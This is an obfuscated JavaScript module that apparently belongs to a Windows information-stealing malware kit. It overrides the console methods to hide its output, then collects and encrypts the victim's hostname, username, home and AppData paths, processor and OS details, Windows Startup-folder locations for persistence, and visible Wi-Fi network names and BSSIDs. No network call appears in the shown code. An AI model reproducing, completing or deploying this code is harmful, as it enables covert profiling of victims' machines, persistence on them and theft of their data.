const _0x2559d0 = (function () {
    let _0x14f20b = true
    return function (_0x4d9d68, _0x58a748) {
      const _0x19586e = _0x14f20b
        ? function () {
            if (_0x58a748) {
              const _0x18479c = _0x58a748.apply(_0x4d9d68, arguments)
              return (_0x58a748 = null), _0x18479c
            }
          }
        : function () {}
      return (_0x14f20b = false), _0x19586e
    }
  })()
  const _0x3d1fce = _0x2559d0(this, function () {
    let _0x45c2f0
    try {
      const _0x2cd812 = Function(
        'return (function() {}.constructor("return this")( ));'
      )
      _0x45c2f0 = _0x2cd812()
    } catch (_0x1bbc93) {
      _0x45c2f0 = window
    }
    const _0x17db2d = (_0x45c2f0.console = _0x45c2f0.console || {})
    const _0x32bbb0 = [
      'log',
      'warn',
      'info',
      'error',
      'exception',
      'table',
      'trace',
    ]
    for (let _0xf9ac56 = 0; _0xf9ac56 < _0x32bbb0.length; _0xf9ac56++) {
      const _0x51d64c = _0x2559d0.constructor.prototype.bind(_0x2559d0),
        _0x3a3201 = _0x32bbb0[_0xf9ac56],
        _0x310db0 = _0x17db2d[_0x3a3201] || _0x51d64c
      _0x51d64c['__proto__'] = _0x2559d0.bind(_0x2559d0)
      _0x51d64c.toString = _0x310db0.toString.bind(_0x310db0)
      _0x17db2d[_0x3a3201] = _0x51d64c
    }
  })
  _0x3d1fce()
  module.exports = (_0x1416e1) => {
    return {
      cpus: [],
      ram: _0x1416e1.utils.encryption.encryptData(
        Math.round(_0x1416e1.requires.os.totalmem() / 1024 / 1024 / 1024) + ' GB'
      ),
      version: _0x1416e1.utils.encryption.encryptData(
        _0x1416e1.requires.os.version()
      ),
      uptime: _0x1416e1.utils.encryption.encryptData(
        (_0x1416e1.requires.os.uptime() / 60).toFixed(0) +
          ' minutes (' +
          (_0x1416e1.requires.os.uptime() / 60 / 60).toFixed(2) +
          ' hours)'
      ),
      hostdir: _0x1416e1.utils.encryption.encryptData(
        _0x1416e1.requires.os.homedir()
      ),
      hostname: _0x1416e1.utils.encryption.encryptData(
        _0x1416e1.requires.os.hostname()
      ),
      username: _0x1416e1.utils.encryption.encryptData(
        _0x1416e1.requires.os.userInfo().username
      ),
      type: _0x1416e1.utils.encryption.encryptData(_0x1416e1.requires.os.type()),
      arch: _0x1416e1.utils.encryption.encryptData(_0x1416e1.requires.os.arch()),
      release: _0x1416e1.utils.encryption.encryptData(
        _0x1416e1.requires.os.release()
      ),
      appdata: _0x1416e1.utils.encryption.encryptData(process.env.APPDATA),
      localappdata: _0x1416e1.utils.encryption.encryptData(
        process.env.LOCALAPPDATA
      ),
      temp: _0x1416e1.utils.encryption.encryptData(process.env.TEMP),
      user_domain: _0x1416e1.utils.encryption.encryptData(
        process.env.COMPUTERNAME
      ),
      monitor_address: _0x1416e1.utils.encryption.encryptData(
        process.env.MONITOR_ADDRESS
      ),
      processor_identifier: _0x1416e1.utils.encryption.encryptData(
        process.env.PROCESSOR_IDENTIFIER
      ),
      processor_architecture: _0x1416e1.utils.encryption.encryptData(
        process.env.PROCESSOR_ARCHITECTURE
      ),
      processors: _0x1416e1.utils.encryption.encryptData(
        process.env.NUMBER_OF_PROCESSORS
      ),
      system_drive: _0x1416e1.utils.encryption.encryptData(
        process.env.SystemDrive
      ),
      autostart: [
        _0x1416e1.utils.encryption.encryptData(
          process.env.APPDATA +
            '\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'
        ),
        _0x1416e1.utils.encryption.encryptData(
          process.env.SystemDrive +
            '\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'
        ),
      ],
      wifi_connections: async () => {
        const _0xf7287d =
          await _0x1416e1.requires.systeminformation.getDynamicData()
        let _0x25c984 = ''
        return (
          _0xf7287d.wifiNetworks.forEach((_0x897768) => {
            _0x25c984 += _0x897768.ssid + ' | ' + _0x897768.bssid + '\n'
          }),
          (_0x1416e1.config.counter.wifinetworks = _0xf7287d.wifiNetworks.length),
          _0x25c984
        )
      },
      connection_info: undefined,
    }
  }
  